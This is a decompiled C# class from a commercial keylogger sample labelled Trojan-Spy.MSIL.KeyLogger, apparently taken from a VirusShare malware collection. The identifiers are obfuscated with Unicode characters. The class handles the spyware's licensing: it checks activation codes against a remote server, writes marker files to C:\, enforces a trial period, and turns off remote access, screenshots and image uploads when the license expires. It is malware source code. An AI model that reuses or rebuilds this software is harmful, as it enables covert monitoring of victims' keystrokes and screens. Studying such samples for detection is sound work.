// Decompiled with JetBrains decompiler
// Type: ᠨ
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using KeyLogger.Properties;
using System;
using System.IO;
using System.Web;
using System.Windows.Forms;

internal class ᠨ
{
  private static អ ᡆᙃ;

  public static void ᡂ()
  {
    do
      ;
    while (false);
    try
    {
      អ អ = new អ();
      string upper = Settings.Default.ActivationCode.ToUpper();
      if (upper.StartsWith("0001KL"))
        ᠨ.ᠪ();
      else if (upper.StartsWith("00012M"))
        ᠨ.ᠮ();
      else if (File.Exists("C:\\" + Settings.Default.ActivationCode + ".txt"))
        ᠨ.ᠪ();
      else if (អ.ឪ(អ.ឮ, string.Format("?class=application&method=verifyCode&parameters={0}", (object) HttpUtility.UrlEncode(Settings.Default.ActivationCode))).Equals("1"))
      {
        ᠨ.ᠪ();
        if (Directory.Exists("C:\\"))
        {
          FileStream fileStream = File.Create("C:\\" + Settings.Default.ActivationCode + ".txt");
          fileStream.Close();
          fileStream.Dispose();
        }
      }
      ᙀ.ᙬ.ᝈ(false);
      ᙀ.ᙬ.ᝄ();
    }
    catch (Exception ex)
    {
      ᠨ.ᡆᙃ.ឨ(ex);
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public static void ᠰ()
  {
    do
      ;
    while (false);
    try
    {
      អ អ = new អ();
      string str = អ.ឪ(អ.ឮ, string.Format("?class=application&method=getCode&parameters={0},{1}", (object) HttpUtility.UrlEncode(Settings.Default.RemoteUser), (object) HttpUtility.UrlEncode(Settings.Default.RemotePass)));
      if (!str.Equals(""))
      {
        if (!str.Equals("0"))
        {
          Settings.Default.ActivationCode = str;
          Settings.Default.Save();
          ᙀ.ᙬ.ᝠ();
          if (Directory.Exists("C:\\"))
          {
            FileStream fileStream = File.Create("C:\\" + Settings.Default.ActivationCode + ".txt");
            fileStream.Close();
            fileStream.Dispose();
          }
          ᙀ.ᙬ.ᝈ(false);
        }
      }
    }
    catch (Exception ex)
    {
      ᠨ.ᡆᙃ.ឨ(ex);
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public static void ᠮ()
  {
    do
      ;
    while (false);
    try
    {
      អ អ = new អ();
      string str = អ.ឪ(អ.ឮ, string.Format("?class=application&method=getTwoMonthPurchaseDate&parameters={0}", (object) HttpUtility.UrlEncode(Settings.Default.ActivationCode)));
      DateTime exact;
      if (str != "" && str != "0")
      {
        exact = DateTime.ParseExact(str, "yyyy-MM-dd HH:mm tt", (IFormatProvider) null);
        Settings.Default.ExpireDate = \u17E0.\u17E6(str);
        Settings.Default.Save();
        ᙀ.ᙬ.\u177E();
      }
      else if (Settings.Default.ExpireDate != "")
      {
        exact = DateTime.ParseExact(\u17E0.\u17E2(Settings.Default.ExpireDate), "yyyy-MM-dd HH:mm tt", (IFormatProvider) null);
      }
      else
      {
        ᠨ.ᠪ();
        goto label_10;
      }
      string s = អ.ឪ(អ.ឮ, "?class=application&method=getDate");
      DateTime dateTime = !(s != "") || !(s != "0") ? DateTime.Now : DateTime.ParseExact(s, "yyyy-MM-dd HH:mm tt", (IFormatProvider) null);
      if (exact.CompareTo(dateTime) < 0)
      {
        ᙀ.ᙬ.ᝊ();
        Settings.Default.RemoteAccess = false;
        Settings.Default.ScreenshotDuration = -1;
        Settings.Default.UploadImages = false;
        Settings.Default.Save();
        ᙀ.ᙬ.\u177E();
        ᙀ.ᙬ.ᝈ(true);
      }
      else
        ᠨ.ᠪ();
    }
    catch (Exception ex)
    {
      ᠨ.ᡆᙃ.ឨ(ex);
    }
label_10:
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public static void ᠬ()
  {
    do
      ;
    while (false);
    try
    {
      អ អ = new អ();
      DateTime dateTime1 = !File.Exists("C:\\f_run.txt") ? (!File.Exists(Application.StartupPath + "\\uninstall.exe") ? File.GetLastWriteTime(Application.ExecutablePath) : File.GetLastWriteTime(Application.StartupPath + "\\uninstall.exe")) : File.GetCreationTime("C:\\f_run.txt");
      dateTime1 = dateTime1.AddDays(3.0);
      string s = អ.ឪ(អ.ឮ, "?class=application&method=getDate");
      DateTime dateTime2 = !(s != "") || !(s != "0") ? DateTime.Now : DateTime.ParseExact(s, "yyyy-MM-dd HH:mm tt", (IFormatProvider) null);
      if (dateTime1.CompareTo(dateTime2) < 0)
      {
        ᙀ.ᙬ.\u1758();
        ᙀ.ᙬ.ᝈ(false);
      }
      else
      {
        ᙀ.ᙬ.ᝢ();
        ᙀ.ᙬ.ᝈ(true);
      }
    }
    catch (Exception ex)
    {
      ᠨ.ᡆᙃ.ឨ(ex);
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public static string ᠲ()
  {
    do
      ;
    while (false);
    អ អ = new អ();
    string str = "";
    try
    {
      if ((str = អ.ឦ()) == "")
        str = Environment.MachineName;
    }
    catch (Exception ex)
    {
      ᠨ.ᡆᙃ.ឨ(ex);
    }
    return str;
  }

  public static void ᠪ()
  {
    do
      ;
    while (false);
    try
    {
      string upper = Settings.Default.ActivationCode.ToUpper();
      if (upper.StartsWith("0001KL"))
        ᙀ.ᙬ.ᝢ();
      else if (upper.StartsWith("00012M"))
        ᙀ.ᙬ.ᝠ();
      else
        ᙀ.ᙬ.ᝠ();
      ᙀ.ᙬ.ᝈ(false);
    }
    catch (Exception ex)
    {
      ᠨ.ᡆᙃ.ឨ(ex);
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public ᠨ()
  {
    do
      ;
    while (false);
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  static ᠨ()
  {
    do
      ;
    while (false);
    ᠨ.ᡆᙃ = new អ();
  }
}
